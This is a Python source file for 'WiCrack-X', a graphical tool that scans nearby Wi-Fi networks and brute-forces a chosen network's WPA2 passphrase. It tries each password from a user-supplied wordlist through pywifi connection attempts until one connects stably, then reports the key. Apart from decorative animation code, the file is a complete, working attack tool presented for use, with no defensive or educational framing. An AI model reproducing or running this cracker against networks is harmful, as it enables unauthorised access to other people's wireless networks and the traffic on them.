import pywifi
from pywifi import const
import time
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import os
import random

class WiCrackX:
    def __init__(self, root):
        self.root = root
        self.root.title("WiCrack-X")
        self.root.geometry("1000x800")
        self.root.configure(bg="#000022")
        self.root.resizable(True, True)

        self.canvas = tk.Canvas(root, bg="#000022", highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.particles = []
        self.create_particles()

        main_frame = tk.Frame(root, bg="#000022")
        main_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.95, relheight=0.95)

        tk.Label(main_frame, text="WiCrack-X", font=("Courier", 40, "bold"),
                 fg="#00aaff", bg="#000022").pack(pady=(30, 20))

        log_frame = tk.Frame(main_frame, bg="#000033", highlightbackground="#004466", highlightthickness=4)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 20), padx=10)
        self.result_text = tk.Text(log_frame, height=12, bg="#000044", fg="#88ddff", font=("Courier", 11),
                                   state='disabled', insertbackground="#88ddff")
        self.result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        scan_frame = tk.Frame(main_frame, bg="#000022")
        scan_frame.pack(fill=tk.X, pady=15)
        tk.Button(scan_frame, text="SCAN NETWORKS", command=self.scan_networks,
                  bg="#001133", fg="#00aaff", font=("Courier", 14, "bold"),
                  relief="flat", activebackground="#002244",
                  highlightbackground="#0066aa", highlightthickness=3).pack(side=tk.LEFT, padx=20)

        self.network_combo = ttk.Combobox(scan_frame, width=60, font=("Courier", 12), state="readonly")
        self.network_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=20)
        self.network_combo.bind("<<ComboboxSelected>>", self.on_ssid_select)

        ssid_frame = tk.Frame(main_frame, bg="#000022")
        ssid_frame.pack(fill=tk.X, pady=10)
        tk.Label(ssid_frame, text="Target SSID:", font=("Courier", 14), fg="#66ccff", bg="#000022").pack(side=tk.LEFT, padx=10)
        self.ssid_var = tk.StringVar()
        tk.Entry(ssid_frame, textvariable=self.ssid_var, font=("Courier", 13),
                 bg="#001133", fg="#88ddff", insertbackground="#88ddff", bd=2,
                 highlightbackground="#0066aa").pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)

        wl_frame = tk.Frame(main_frame, bg="#000022")
        wl_frame.pack(fill=tk.X, pady=15)
        tk.Button(wl_frame, text="BROWSE WORDLIST", command=self.browse_wordlist,
                  bg="#001133", fg="#00aaff", font=("Courier", 13, "bold"), relief="flat",
                  highlightbackground="#0066aa", highlightthickness=3).pack(side=tk.LEFT, padx=20)

        self.wordlist_var = tk.StringVar()
        self.wordlist_name = tk.StringVar(value="No wordlist selected")
        tk.Label(wl_frame, textvariable=self.wordlist_name, fg="#88ddff", bg="#000022", font=("Courier", 12)).pack(side=tk.LEFT, padx=20)

        ctrl_frame = tk.Frame(main_frame, bg="#000022")
        ctrl_frame.pack(pady=25)
        self.start_btn = tk.Button(ctrl_frame, text="START CRACK", command=self.start_crack_thread,
                                   bg="#002244", fg="#00aaff", font=("Courier", 16, "bold"), width=15,
                                   relief="flat", highlightbackground="#0066aa", highlightthickness=4)
        self.start_btn.pack(side=tk.LEFT, padx=30)

        self.pause_btn = tk.Button(ctrl_frame, text="PAUSE", command=self.toggle_pause,
                                   bg="#003366", fg="#99eeff", font=("Courier", 14, "bold"), width=10,
                                   state="disabled", relief="flat", highlightbackground="#3399ff", highlightthickness=3)
        self.pause_btn.pack(side=tk.LEFT, padx=30)

        self.stop_btn = tk.Button(ctrl_frame, text="STOP", command=self.stop_crack,
                                  bg="#330011", fg="#ff6666", font=("Courier", 14, "bold"), width=10,
                                  state="disabled", relief="flat", highlightbackground="#cc3333", highlightthickness=3)
        self.stop_btn.pack(side=tk.LEFT, padx=30)

        self.progress = ttk.Progressbar(main_frame, mode='determinate', length=850)
        prog_style = ttk.Style()
        prog_style.configure("blue.Horizontal.TProgressbar", troughcolor="#000033", background="#00aaff")
        self.progress.configure(style="blue.Horizontal.TProgressbar")
        self.progress.pack(pady=20)

        self.status_var = tk.StringVar(value="READY")
        tk.Label(main_frame, textvariable=self.status_var, font=("Courier", 16, "bold"),
                 fg="#00aaff", bg="#000022").pack(pady=10)

        self.stop_event = threading.Event()
        self.pause_event = threading.Event()
        self.cracking = False
        self.paused = False

        self.animate_particles()

    def on_ssid_select(self, event):
        selected = self.network_combo.get()
        if selected:
            self.ssid_var.set(selected)
            self.log(f"[+] Target SSID set to: {selected}")

    def create_particles(self):
        for _ in range(120):
            x = random.randint(0, 1000)
            y = random.randint(-200, 800)
            size = random.randint(1, 5)
            speed = random.uniform(0.8, 3.0)
            self.particles.append({"x": x, "y": y, "size": size, "speed": speed, "id": None, "trail": []})
            self.update_particle(self.particles[-1])

    def update_particle(self, p):
        if p["id"]:
            self.canvas.delete(p["id"])
        for t in p["trail"]:
            self.canvas.delete(t)
        p["trail"] = []

        p["y"] += p["speed"]
        if p["y"] > 800:
            p["y"] = -20
            p["x"] = random.randint(0, 1000)

        p["id"] = self.canvas.create_oval(p["x"], p["y"], p["x"] + p["size"], p["y"] + p["size"],
                                           fill="#000044", outline="#0066aa", width=1)

        for i in range(1, 6):
            alpha = 0.8 - (i * 0.15)
            r = int(0 * alpha)
            g = int(102 * alpha)
            b = int(170 * alpha)
            color = f"#{r:02x}{g:02x}{b:02x}"
            trail_id = self.canvas.create_oval(p["x"] + i * 2, p["y"] - i * 3, p["x"] + p["size"] + i * 2,
                                               p["y"] + p["size"] - i * 3,
                                               fill="#000044", outline=color, width=1)
            p["trail"].append(trail_id)

    def animate_particles(self):
        for p in self.particles:
            self.update_particle(p)
        self.root.after(40, self.animate_particles)

    def log(self, message):
        self.result_text.config(state='normal')
        self.result_text.insert(tk.END, f"> {message}\n")
        self.result_text.see(tk.END)
        self.result_text.config(state='disabled')

    def browse_wordlist(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file:
            self.wordlist_var.set(file)
            filename = os.path.basename(file)
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    count = sum(1 for _ in f)
                self.wordlist_name.set(f"WORDLIST: {filename} ({count} entries)")
                self.log(f"[+] Loaded: {filename} ({count} passwords)")
            except Exception as e:
                self.wordlist_name.set(f"WORDLIST: {filename} (error)")
                self.log(f"[-] Load failed: {e}")

    def scan_networks(self):
        self.log("[SCAN] Starting...")
        self.status_var.set("SCANNING...")
        self.network_combo['values'] = []
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            time.sleep(5)
            results = iface.scan_results()
            ssids = sorted(set(n.ssid for n in results if n.ssid.strip()))
            self.network_combo['values'] = ssids
            self.log(f"[+] Found {len(ssids)} networks")
            self.status_var.set("SCAN COMPLETE")
        except Exception as e:
            self.log(f"[-] Scan error: {e}")
            self.status_var.set("SCAN ERROR")

    def start_crack_thread(self):
        if self.cracking:
            return
        ssid = self.ssid_var.get().strip()
        wordlist_path = self.wordlist_var.get().strip()
        if not ssid or not wordlist_path:
            messagebox.showerror("Error", "SSID and wordlist required!")
            return

        self.cracking = True
        self.paused = False
        self.stop_event.clear()
        self.pause_event.clear()
        self.result_text.config(state='normal')
        self.result_text.delete(1.0, tk.END)
        self.result_text.config(state='disabled')
        self.status_var.set(f"CRACKING {ssid}...")
        self.start_btn.config(state="disabled")
        self.pause_btn.config(state="normal")
        self.stop_btn.config(state="normal")

        self.log("[START] Beginning brute-force")
        self.log(f"Target: {ssid}")
        self.log(f"Wordlist: {os.path.basename(wordlist_path)}")

        threading.Thread(target=self.crack_wifi, args=(ssid, wordlist_path), daemon=True).start()

    def crack_wifi(self, ssid, wordlist_path):
        wifi = pywifi.PyWiFi()
        try:
            iface = wifi.interfaces()[0]
        except:
            self.log("[-] No interface found")
            self.finish_crack("NO INTERFACE")
            return

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.log(f"[+] Loaded {len(passwords)} passwords")
        except Exception as e:
            self.log(f"[-] Wordlist error: {e}")
            self.finish_crack("WORDLIST ERROR")
            return

        if not passwords:
            self.log("[-] Wordlist empty")
            self.finish_crack("EMPTY WORDLIST")
            return

        self.progress['maximum'] = len(passwords)
        self.progress['value'] = 0

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        for idx, pwd in enumerate(passwords, 1):
            if self.stop_event.is_set():
                self.finish_crack("TERMINATED")
                return

            while self.paused and not self.stop_event.is_set():
                time.sleep(0.2)
                self.root.update()

            self.log(f"[{idx}/{len(passwords)}] Trying: {pwd}")

            profile.key = pwd
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)

            connected = False
            start = time.time()
            self.log("  Waiting for connection (max 8s)...")

            while time.time() - start < 8:
                time.sleep(0.6)
                status = iface.status()
                self.log(f"  Status: {status}")

                if status == const.IFACE_CONNECTED:
                    connected = True
                    break
                if status == const.IFACE_DISCONNECTED:
                    break

            if connected:
                self.log("  Connected — testing stability (3s)...")
                stable = True
                for _ in range(5):
                    time.sleep(0.6)
                    if iface.status() != const.IFACE_CONNECTED:
                        self.log("  Dropped → false positive")
                        stable = False
                        break

                if stable:
                    self.log(f"\n[!] SUCCESS [!] Password: {pwd}")
                    self.log(f"Connected to {ssid}")
                    self.finish_crack(f"KEY FOUND: {pwd}")
                    return
                else:
                    self.log("  Unstable connection")
            else:
                self.log("  No connection")

            self.progress['value'] = idx
            self.root.update_idletasks()
            iface.disconnect()
            time.sleep(0.8)

        self.finish_crack("NO MATCH")

    def toggle_pause(self):
        if not self.cracking:
            return
        self.paused = not self.paused
        if self.paused:
            self.pause_btn.config(text="RESUME", bg="#004488")
            self.status_var.set("PAUSED")
            self.log("[PAUSED]")
        else:
            self.pause_btn.config(text="PAUSE", bg="#003366")
            self.status_var.set("RESUMED")
            self.log("[RESUMED]")

    def stop_crack(self):
        if self.cracking:
            self.stop_event.set()
            self.log("[STOPPED]")
            self.finish_crack("STOPPED")

    def finish_crack(self, msg):
        self.status_var.set(msg)
        self.log(msg)
        self.cracking = False
        self.paused = False
        self.progress['value'] = 0
        self.start_btn.config(state="normal")
        self.pause_btn.config(state="disabled", text="PAUSE")
        self.stop_btn.config(state="disabled")

if __name__ == "__main__":
    root = tk.Tk()
    app = WiCrackX(root)
    root.mainloop()